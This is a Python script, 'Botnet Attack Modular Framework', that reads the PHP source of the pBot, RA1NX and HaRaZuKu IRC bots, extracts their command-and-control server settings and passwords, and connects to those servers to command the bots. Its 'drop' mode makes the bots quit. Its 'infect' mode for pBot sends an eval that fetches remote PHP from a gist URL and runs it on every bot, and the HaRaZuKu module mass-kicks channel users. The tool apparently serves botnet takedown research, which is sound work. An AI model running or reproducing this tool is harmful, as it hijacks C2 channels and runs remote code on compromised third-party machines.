#!/usr/bin/python
import sys
import argparse
import re
import json
import socket
import string
import time
import datetime
import string

version = "0.1-scripted_bots-PoC"

def PrintHelp():
    global version
    print "usage: bamf.py [-h] [action] [source]"
    print ""
    print "Botnet Attack Modular Framework v" + version
    print "Exploiting botnets from the source of the bot"
    print "By Brian Wallace (@botnet_hunter)"
    print ""
    print "arguments:"
    print "  action        Actions to be taken against the botnet (default: dump)"
    print "                dump - Print configuration information obtained from source file"
    print "                drop - Execute a command to make the bot scripts exit"
    print "  source        Path to non-obfuscated source code for the target bot (default: stdin)"
    print ""
    print "  -h, --help    Print this message"
    print ""
    print "Supported botnets:"
    print "  pBot"
    print "  RA1NX"
    print "  HaRaZuKu"

## begin HaRaZuKu ##
class HaRaZuKuModule:
    def BotName(self):
        return "HaRaZuKu"

    def IsRightBot(self, source):
        try:
            p = re.compile(r'\$msg = str_replace\(":KB \$com\[4\]","",\$msg\);')
            result = p.search(source)
            if result == None:
                return False
            return source
        except:
            return False

    def GetConfigValues(self, config):
        try:
            p = re.compile(r'\$(?P<key>[^\s=]+)[\s]*=[\s]*(?P<value>[^;]+);', re.MULTILINE)
            results = p.findall(config)
            ret = {}
            for pair in results:
                if pair[0] not in ret:
                    ret[pair[0]] = pair[1]
            return ret
        except:
            return False

    def ValidateValues(self, values):
        return "remotehost2" in values and "port" in values and "nicklist" in values and "channels" in values and 'admin' in values

    def ExecuteAction(self, action, source):
        config = self.IsRightBot(source)
        if config == False:
            return False
        values = self.GetConfigValues(config)
        if values == False:
            return False
        if self.ValidateValues(values) == False:
            print values
            return False

        if action == 'dump':
            print json.dumps(values, sort_keys=True, indent=4, separators=(',', ': '))
            return True
        elif action == 'drop' or action == 'infect':
            conf = {}
            conf['users'] = []
            for match in re.findall(r'"([^"]+)"', values['nicklist']):
                conf['users'].append(match)

            conf['server'] = re.findall(r'"([^"]+)"', values['remotehost2'])[0]
            conf['port'] = values['port'][1:][:-1]
            conf['channels'] = values['channels'][1:][:-1].split(",")
            conf['pass'] = None
            conf['mode'] = action
            conf['admin'] = values['admin'][1:][:-1]
            conf['whitelist'] = []
            print "Launching bot"
            bot = self.HaRaZuKu(conf)
            bot.start()
            print "Completed"


    class HaRaZuKu:
        def __init__(self, config):
            self.config = config

            self.nick = 'somenick'
            self.user = 'someuser'
            self.real = 'somereal'

            if 'nick' in config:
                self.nick = self.config['nick']
            if 'user' in config:
                self.user = self.config['user']
            if 'real' in config:
                self.real = self.config['real']
            
            self.usersToAttack = self.config['users']
            self.userList = {}

            self.ownerList = {}
            self.opList = {}
            self.hopList = {}

        def log(self, message):
            print "[" + str(datetime.datetime.utcnow()) + "] " + message

        def send(self, message):
            self.log(message)
            self.sock.sendall(message + "\r\n")

        def set_nick(self, nick):
            self.send("NICK " + nick)

        def privmsg(self, to, msg):
            self.send("PRIVMSG " + to + " :" + msg)

        def join(self, channel, key = None):
            if key != None:
                self.send("JOIN " + channel + " " + key)
            else:
                self.send("JOIN " + channel)

        def part(self, channel):
            self.send("PART " + channel)

        def whois(self, nick):
            self.send("WHOIS " + nick)

        def list(self):
            self.send("LIST")

        def notice(self, target, message):
            self.send("NOTICE " + target + " :" + message)

        def start(self):
            self.server = socket.gethostbyname(self.config['server'])
            self.port = int(self.config['port'])
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server, self.port))

            #send pass
            if self.config["pass"] != None:
                self.send("PASS " + self.config["pass"])

            self.send("USER " + self.user + " 127.0.0.1 localhost :" + self.real)
            self.set_nick(self.nick)
            self.main()

        def main(self):
            data = ""
            hasListed = False
            f = self.sock.makefile()
            while True:
                data = f.readline()
                if not data:
                    self.log("Disconnected")
                    break
                for line in [data]:
                    line = line[:-2]
                    self.log(line)                
                    if line[:6] == "PING :":
                        self.send("PONG :" + line[6:])                
                    cmd = string.split(line, " ")
                    if len(cmd) > 1:
                        if cmd[1] == "433":
                            self.set_nick(self.nick)
                        if cmd[1] == "422" or cmd[1] == "376":
                            for channel in self.config['channels']:
                                self.join(channel)
                        if cmd[1] == "353":
                            if cmd[4] not in self.userList:
                                self.userList[cmd[4]] = []
                            
                            self.opList[cmd[4]] = []
                            self.ownerList[cmd[4]] = []
                            self.hopList[cmd[4]] = []                            

                            for nick in string.split(string.split(line, ":")[2], " "):
                                if nick == "" or nick == " ":
                                    continue
                                if nick[0] == "@" or nick[0] == "~" or nick[0] == "%" or nick[0] == "+":
                                    if nick[0] == "@":
                                        if nick[1:] not in self.opList[cmd[4]]:
                                            self.opList[cmd[4]].append(nick[1:])
                                    if nick[0] == "~":
                                        if nick[1:] not in self.ownerList[cmd[4]]:
                                            self.ownerList[cmd[4]].append(nick[1:])
                                    if nick[0] == "%":
                                        if nick[1:] not in self.hopList[cmd[4]]:
                                            self.hopList[cmd[4]].append(nick[1:])
                                    nick = nick[1:]
                                if nick not in self.userList[cmd[4]]:
                                    self.userList[cmd[4]].append(nick)
                        if cmd[1] == "366" or cmd[1] == "475" or cmd[1] == "477" or cmd[1] == "520" or cmd[1] == "474":
                            channel = cmd[3]

                            # Kick everyone else
                            if channel in self.userList:
                                self.userList[channel].remove(self.nick)

                                if "whitelist" in self.config:
                                    for nick in self.config['whitelist']:
                                        if nick in self.userList[channel]:
                                            self.userList[channel].remove(nick)

                                op = None
                                for nick in self.userList[channel]:
                                    if nick in self.usersToAttack:
                                        if nick in self.ownerList:
                                            op = nick
                                            break

                                if op == None:
                                    for nick in self.userList[channel]:
                                        if nick in self.usersToAttack:
                                            if nick in self.opList:
                                                op = nick
                                                break

                                if op == None:
                                    for nick in self.userList[channel]:
                                        if nick in self.usersToAttack:
                                            if nick in self.hopList:
                                                op = nick
                                                break

                                if op == None:
                                    op = channel

                                for nick in self.userList[channel]:
                                    if nick != op:
                                        self.notice(op, "\x01KB " + channel + " " + nick + " @--- BAMF! \x01")

                                self.notice(channel, "\x01KB " + channel + " you @* BAMF \x01")

                            self.config['channels'].remove(channel)
                            if len(self.config['channels']) == 0:
                                self.send("QUIT :")
## end HaRaZuKu ##

## begin RA1NX ##
class RA1NXModule:
    def BotName(self):
        return "RA1NX"

    def IsRightBot(self, source):
        try:
            p = re.compile(r'if\(substr\(\$line\[3\],1,strlen\(\$line\[3\]\)\)==\$nick\){ \$pubcalled = true; }')
            result = p.search(source)
            if result == None:
                return False
            return source
        except:
            return False

    def GetConfigValues(self, config):
        try:
            p = re.compile(r'\$(?P<key>[^\s=]+)[\s]*=[\s]*"(?P<value>[^"]*)"', re.MULTILINE)
            results = p.findall(config)
            ret = {}
            for pair in results:
                ret[pair[0]] = pair[1]
            return ret
        except:
            return False

    def ValidateValues(self, values):
        return "servers" in values and "ports" in values and "nicknames" in values

    def beArray(self, input):
        input = string.replace(input, "\r", "")
        input = string.replace(input, "\n", "")
        input = string.replace(input, "\t", "")
        input = string.replace(input, " ", "")
        return input.split(',')


    def ExecuteAction(self, action, source):
        config = self.IsRightBot(source)
        if config == False:
            return False
        values = self.GetConfigValues(config)
        if values == False:
            return False
        if self.ValidateValues(values) == False:
            return False

        if action == 'dump':
            print json.dumps(values, sort_keys=True, indent=4, separators=(',', ': '))
            return True
        elif action == 'drop' or action == 'infect':
            for server in self.beArray(values['servers']):
                for port in self.beArray(values['ports']):
                    conf = {}
                    conf['server'] = server
                    conf['port'] = port
                    conf['users'] = self.beArray(values['nicknames'])
                    conf['pass'] = None
                    conf['mode'] = action
                    print "Launching bot"
                    bot = self.RA1NX(conf)
                    bot.start()
            print "Completed"


    class RA1NX:
        def __init__(self, config):
            self.config = config

            self.nick = 'somenick'
            self.user = 'someuser'
            self.real = 'somereal'

            if 'nick' in config:
                self.nick = self.config['nick']
            if 'user' in config:
                self.user = self.config['user']
            if 'real' in config:
                self.real = self.config['real']
            
            self.usersToAttack = self.config['users']

        def log(self, message):
            print "[" + str(datetime.datetime.utcnow()) + "] " + message

        def send(self, message):
            self.log(message)
            self.sock.sendall(message + "\r\n")

        def set_nick(self, nick):
            self.send("NICK " + nick)

        def privmsg(self, to, msg):
            self.send("PRIVMSG " + to + " :" + msg)

        def join(self, channel, key = None):
            if key != None:
                self.send("JOIN " + channel + " " + key)
            else:
                self.send("JOIN " + channel)

        def part(self, channel):
            self.send("PART " + channel)

        def whois(self, nick):
            self.send("WHOIS " + nick)

        def list(self):
            self.send("LIST")

        def start(self):
            self.server = socket.gethostbyname(self.config['server'])
            self.port = int(self.config['port'])
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server, self.port))

            #send pass
            if self.config["pass"] != None:
                self.send("PASS " + self.config["pass"])

            self.send("USER " + self.user + " 127.0.0.1 localhost :" + self.real)
            self.set_nick(self.nick)
            self.main()

        def main(self):
            data = ""
            hasListed = False
            f = self.sock.makefile()
            while True:
                data = f.readline()
                if not data:
                    self.log("Disconnected")
                    break
                for line in [data]:
                    line = line[:-2]
                    self.log(line)                
                    if line[:6] == "PING :":
                        self.send("PONG :" + line[6:])                
                    cmd = string.split(line, " ")
                    if len(cmd) > 1:
                        if cmd[1] == "433":
                            self.set_nick(self.nick)
                        if cmd[1] == "422" or cmd[1] == "376":
                            for nick in self.usersToAttack:
                                self.privmsg(nick, nick + " @msg " + self.nick + " someconfirmationstring")
                                self.privmsg(nick, nick + " @off BAMF!")
                                time.sleep(.1)
                            self.send("QUIT :")
## end RA1NX ##

## begin pBot ##
class pBotModule:
    def BotName(self):
        return "pBot"

    def IsRightBot(self, source):
        try:
            p = re.compile(r'var[\s]+\$config[\s]*=[\s]*array[\s]*\([\s]*(\"[^\"]*\"[\s]*=>.*,?[\s]*)*(//)?\);', re.MULTILINE)
            result = p.search(source)
            if result == None:
                return False
            return result.group(0)
        except:
            return False

    def GetConfigValues(self, config):
        try:
            p = re.compile(r'[\'"](?P<key>[^\'"]+)[\'"][\s]*=>[\s]*[\'"](?P<value>[^\'"]+)[\'"]', re.MULTILINE)
            results = p.findall(config)
            ret = {}
            for pair in results:
                ret[pair[0]] = pair[1]
            return ret
        except:
            return False

    def ValidateValues(self, values):
        return "server" in values and "port" in values and ("chan" in values) and "password" in values

    def ExecuteAction(self, action, source):
        config = self.IsRightBot(source)
        if config == False:
            return False
        values = self.GetConfigValues(config)
        if values == False:
            return False
        if self.ValidateValues(values) == False:
            return False

        if action == 'dump':
            print json.dumps(values, sort_keys=True, indent=4, separators=(',', ': '))
            return True
        elif args.action == 'drop' or args.action == 'infect':
            if "hostauth" not in values or values["hostauth"] == "*":
                conf = {}

                conf['payload'] = "eval(file_get_contents(\"https://gist.github.com/bwall/c37f5288fb2456a1c108/raw/3664175261b5b112a3d7c5dcdf1148ba0ba980d6/gistfile1.txt\"));"

                conf['mode'] = args.action
                conf['server'] = values['server']
                conf['port'] = values['port']
                conf['channels'] = []
                if 'chan' in values:
                    conf['channels'].append(values['chan'])
                
                conf['pass'] = None
                if 'pass' in values:
                    conf['pass'] = values['pass']

                conf['key'] = "correct"
                if 'key' in values:
                    conf['key'] = values['key']

                conf['password'] = values['password']
                conf['trigger'] = '.'
                if 'trigger' in values:
                    conf['trigger'] = values['trigger']

                conf['nick'] = 'pBotFails'
                conf['user'] = 'pBotFails'
                conf['real'] = 'pBotFails'

                bot = self.PBot(conf)
                print "Launching bot"
                bot.start()
                print "Completed"
            else:
                return False


    class PBot:
        def __init__(self, config):
            self.config = config

            self.nick = 'somenick'
            self.user = 'someuser'
            self.real = 'somereal'

            if 'nick' in config:
                self.nick = self.config['nick']
            if 'user' in config:
                self.user = self.config['user']
            if 'real' in config:
                self.real = self.config['real']
            
            self.channels = {}
            self.users = {}
            self.userList = {}

            self.channelsToScan = []
            self.usersToScan = []

        def log(self, message):
            print "[" + str(datetime.datetime.utcnow()) + "] " + message

        def send(self, message):
            self.log(message)
            self.sock.sendall(message + "\r\n")

        def set_nick(self, nick):
            self.send("NICK " + nick)

        def privmsg(self, to, msg):
            self.send("PRIVMSG " + to + " :" + msg)

        def join(self, channel, key = None):
            if key != None:
                self.send("JOIN " + channel + " " + key)
            else:
                self.send("JOIN " + channel)

        def part(self, channel):
            self.send("PART " + channel)

        def whois(self, nick):
            self.send("WHOIS " + nick)

        def list(self):
            self.send("LIST")

        def start(self):
            self.server = socket.gethostbyname(self.config['server'])
            self.port = int(self.config['port'])
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server, self.port))

            #send pass
            if self.config["pass"] != None:
                self.send("PASS " + self.config["pass"])

            self.send("USER " + self.user + " 127.0.0.1 localhost :" + self.real)
            self.set_nick(self.nick)
            self.main()

        def main(self):
            data = ""
            hasListed = False
            f = self.sock.makefile()
            while True:
                data = f.readline()
                if not data:
                    self.log("Disconnected")
                    break
                for line in [data]:
                    line = line[:-2]
                    self.log(line)                
                    if line[:6] == "PING :":
                        self.send("PONG :" + line[6:])                
                    cmd = string.split(line, " ")
                    if len(cmd) > 1:
                        if cmd[1] == "433":
                            self.set_nick(self.nick)
                        if cmd[1] == "422" or cmd[1] == "376":
                            # can join
                            for channel in self.config['channels']:
                                self.join(channel, self.config['key'])
                        if cmd[1] == "366" or cmd[1] == "475" or cmd[1] == "477" or cmd[1] == "520":
                            self.privmsg(cmd[3], self.config['trigger'] + "user " + self.config['password'])
                            if self.config['mode'] == "infect":
                                self.privmsg(cmd[3], self.config['trigger'] + "eval 0 " + self.config['payload'])
                            else:
                                self.privmsg(cmd[3], self.config['trigger'] + "die")
                            self.part(cmd[3])
                            self.send("QUIT :")



modules = []
def LoadModules():
    global modules
    modules.append(pBotModule())
    modules.append(RA1NXModule())
    modules.append(HaRaZuKuModule())

parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('action', nargs='?', type=str, default="dump", help="Actions to be taken against pBots (default: dump)", choices=["dump", "drop", "infect"])
parser.add_argument('botSourceCode', nargs='?', type=argparse.FileType('r'), default=sys.stdin, help="Path to non-obfuscated source code for the target pBot (default: stdin)")
parser.add_argument('-h', '--help', default=False, required=False, action='store_true')

args = parser.parse_args()

if args.help:
    PrintHelp()
    sys.exit()

botbuffer = args.botSourceCode.read()
args.botSourceCode.close()

LoadModules()

for bot in modules:
    if bot.IsRightBot(botbuffer) != False:
        print "Detected " + bot.BotName()
        bot.ExecuteAction(args.action, botbuffer)
        break